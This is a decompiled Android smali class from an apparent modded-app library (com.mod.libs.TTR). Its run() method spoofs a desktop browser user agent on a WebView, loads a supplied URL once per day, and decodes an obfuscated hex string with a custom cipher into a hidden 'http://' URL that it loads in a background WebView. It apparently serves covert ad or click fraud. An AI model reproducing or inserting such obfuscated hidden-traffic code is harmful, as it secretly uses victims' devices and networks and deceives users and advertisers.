.class Lcom/mod/libs/TTR$26$1;
.super Ljava/lang/Object;
.source "TTR.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/mod/libs/TTR$26;->run()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$1:Lcom/mod/libs/TTR$26;

.field private final synthetic val$context:Landroid/content/Context;

.field private final synthetic val$deskSts:Ljava/lang/String;

.field private final synthetic val$lpxStr:Ljava/lang/String;

.field private final synthetic val$sts:Ljava/lang/String;


# direct methods
.method constructor <init>(Lcom/mod/libs/TTR$26;Ljava/lang/String;Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/mod/libs/TTR$26$1;->this$1:Lcom/mod/libs/TTR$26;

    iput-object p2, p0, Lcom/mod/libs/TTR$26$1;->val$sts:Ljava/lang/String;

    iput-object p3, p0, Lcom/mod/libs/TTR$26$1;->val$context:Landroid/content/Context;

    iput-object p4, p0, Lcom/mod/libs/TTR$26$1;->val$deskSts:Ljava/lang/String;

    iput-object p5, p0, Lcom/mod/libs/TTR$26$1;->val$lpxStr:Ljava/lang/String;

    .line 3307
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 11

    .prologue
    const/4 v10, 0x0

    .line 3312
    iget-object v8, p0, Lcom/mod/libs/TTR$26$1;->val$sts:Ljava/lang/String;

    const-string v9, "1"

    invoke-virtual {v8, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-nez v8, :cond_0

    .line 3314
    iget-object v8, p0, Lcom/mod/libs/TTR$26$1;->val$context:Landroid/content/Context;

    sget-object v9, Lcom/mod/libs/TTR;->daudate:Ljava/lang/String;

    invoke-static {v8, v9}, Lcom/mod/libs/TTR;->ClearSharedContains(Landroid/content/Context;Ljava/lang/String;)V

    .line 3318
    :cond_0
    iget-object v8, p0, Lcom/mod/libs/TTR$26$1;->val$deskSts:Ljava/lang/String;

    const-string v9, "1"

    invoke-virtual {v8, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_1

    .line 3320
    invoke-static {}, Lcom/mod/libs/TTR;->access$10()Landroid/webkit/WebView;

    move-result-object v8

    invoke-virtual {v8}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v8

    const-string v9, "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2"

    invoke-virtual {v8, v9}, Landroid/webkit/WebSettings;->setUserAgentString(Ljava/lang/String;)V

    .line 3323
    :cond_1
    invoke-static {}, Lcom/mod/libs/TTR;->GetDate()Ljava/lang/String;

    move-result-object v1

    .line 3324
    .local v1, "curDate":Ljava/lang/String;
    iget-object v8, p0, Lcom/mod/libs/TTR$26$1;->val$context:Landroid/content/Context;

    sget-object v9, Lcom/mod/libs/TTR;->daudate:Ljava/lang/String;

    invoke-static {v8, v9}, Lcom/mod/libs/TTR;->GetSharedString(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v4

    .line 3326
    .local v4, "savedDate":Ljava/lang/String;
    invoke-virtual {v1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-nez v8, :cond_2

    .line 3328
    invoke-static {}, Lcom/mod/libs/TTR;->access$10()Landroid/webkit/WebView;

    move-result-object v8

    iget-object v9, p0, Lcom/mod/libs/TTR$26$1;->val$lpxStr:Ljava/lang/String;

    invoke-virtual {v8, v9}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    .line 3332
    :cond_2
    const-string v2, "4655455842584257434c444a434a435743574257455842544356445645574255414a425941594259434a435743574557425541554258440072"

    .line 3334
    .local v2, "enzy":Ljava/lang/String;
    invoke-static {v2}, Lcom/mod/libs/TTR;->EnzyIsValid(Ljava/lang/String;)Z

    move-result v8

    if-eqz v8, :cond_4

    .line 3336
    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v8

    add-int/lit8 v8, v8, -0x4

    invoke-virtual {v2, v10, v8}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v6

    .line 3337
    .local v6, "text":Ljava/lang/String;
    new-instance v7, Ljava/lang/String;

    new-instance v8, Ljava/math/BigInteger;

    const/16 v9, 0x10

    invoke-direct {v8, v6, v9}, Ljava/math/BigInteger;-><init>(Ljava/lang/String;I)V

    invoke-virtual {v8}, Ljava/math/BigInteger;->toByteArray()[B

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/lang/String;-><init>([B)V

    .line 3340
    .end local v6    # "text":Ljava/lang/String;
    .local v7, "text":Ljava/lang/String;
    invoke-virtual {v7, v10}, Ljava/lang/String;->charAt(I)C

    move-result v8

    add-int/lit8 v8, v8, -0x41

    int-to-byte v0, v8

    .line 3341
    .local v0, "bg":B
    const/4 v8, 0x1

    invoke-virtual {v7}, Ljava/lang/String;->length()I

    move-result v9

    invoke-virtual {v7, v8, v9}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v6

    .line 3343
    .end local v7    # "text":Ljava/lang/String;
    .restart local v6    # "text":Ljava/lang/String;
    const-string v5, ""

    .line 3345
    .local v5, "stemp":Ljava/lang/String;
    const/4 v3, 0x0

    .local v3, "i":I
    :goto_0
    invoke-virtual {v6}, Ljava/lang/String;->length()I

    move-result v8

    div-int/lit8 v8, v8, 0x2

    if-lt v3, v8, :cond_3

    .line 3351
    invoke-static {}, Lcom/mod/libs/TTR;->access$9()Landroid/webkit/WebView;

    move-result-object v8

    invoke-virtual {v8, v5}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    .line 3357
    .end local v0    # "bg":B
    .end local v3    # "i":I
    .end local v5    # "stemp":Ljava/lang/String;
    .end local v6    # "text":Ljava/lang/String;
    :goto_1
    return-void

    .line 3347
    .restart local v0    # "bg":B
    .restart local v3    # "i":I
    .restart local v5    # "stemp":Ljava/lang/String;
    .restart local v6    # "text":Ljava/lang/String;
    :cond_3
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-static {v5}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v9

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    mul-int/lit8 v9, v3, 0x2

    invoke-virtual {v6, v9}, Ljava/lang/String;->charAt(I)C

    move-result v9

    add-int/lit8 v9, v9, -0x41

    mul-int/2addr v9, v0

    mul-int/lit8 v10, v3, 0x2

    add-int/lit8 v10, v10, 0x1

    invoke-virtual {v6, v10}, Ljava/lang/String;->charAt(I)C

    move-result v10

    add-int/lit8 v10, v10, -0x41

    add-int/2addr v9, v10

    int-to-char v9, v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 3345
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    .line 3355
    .end local v0    # "bg":B
    .end local v3    # "i":I
    .end local v5    # "stemp":Ljava/lang/String;
    .end local v6    # "text":Ljava/lang/String;
    :cond_4
    iget-object v8, p0, Lcom/mod/libs/TTR$26$1;->val$context:Landroid/content/Context;

    const v9, 0x493e0

    invoke-static {v8, v9}, Lcom/mod/libs/TTR;->DoFireBlank(Landroid/content/Context;I)V

    goto :goto_1
.end method
